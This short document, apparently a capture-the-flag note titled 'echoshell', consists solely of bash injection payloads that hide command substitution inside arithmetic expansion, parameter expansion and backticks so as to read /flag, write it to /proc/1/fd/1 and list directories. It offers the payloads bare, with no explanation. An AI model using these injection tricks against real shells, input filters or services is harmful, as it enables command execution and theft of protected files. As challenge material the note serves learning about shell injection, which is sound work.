### echoshell

---

```py
payload='arr[$(cat /flag > /proc/1/fd/1)]'; echo $((payload));
echo "${arr[0]=$(cat /flag)}"
a=b; echo "${a/b/$(ls)}"
echo `echo \#; ls -la`
```
